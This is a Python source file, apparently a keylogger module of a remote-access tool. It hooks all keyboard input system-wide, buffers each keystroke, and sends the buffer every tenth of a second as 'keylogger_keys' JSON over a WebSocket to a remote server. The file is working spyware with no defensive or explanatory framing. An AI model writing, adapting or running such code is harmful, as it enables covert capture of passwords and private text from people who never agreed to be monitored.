import time
import threading
import keyboard
import json

SPECIAL_KEYS = {
    'space': '<space>',
    'tab': '<tab>',
    'enter': '<enter>',
    'alt': '<alt>',
    'alt gr': '<altgr>',
    'shift': '<shift>',
    'ctrl': '<ctrl>',
    'backspace': '<backspace>',
    'caps lock': '<capslock>',
    'delete': '<delete>',
    'esc': '<esc>',
    'up': '<up>',
    'down': '<down>',
    'left': '<left>',
    'right': '<right>',
}

keystrokes = []

def log_keystrokes():
    def on_key_event(event):
        if event.event_type == keyboard.KEY_DOWN:
            key_name = event.name
            key_data = SPECIAL_KEYS.get(key_name.lower(), key_name)
            keystrokes.append(key_data)
            print(f"[Keystroke] Logged: {key_data}")

    keyboard.hook(on_key_event)

def send_keystrokes(ws_holder):
    while True:
        time.sleep(0.1)
        if keystrokes and ws_holder.ws:
            try:
                payload = {
                    "type": "keylogger_keys",
                    "data": "".join(keystrokes.copy())
                }
                ws_holder.ws.send(json.dumps(payload))
                keystrokes.clear()
                print("[Keystrokes] Sent keystrokes to server")
            except Exception as e:
                print(f"[Keystrokes Error] Failed to send keystrokes: {e}")
        elif not ws_holder.ws:
            print("[Keystrokes] Waiting for WebSocket connection...", ws_holder.ws)

def start(ws_holder):
    keylog_thread = threading.Thread(target=log_keystrokes, daemon=True)
    keylog_thread.start()

    send_thread = threading.Thread(target=send_keystrokes, args=(ws_holder,), daemon=True)
    send_thread.start()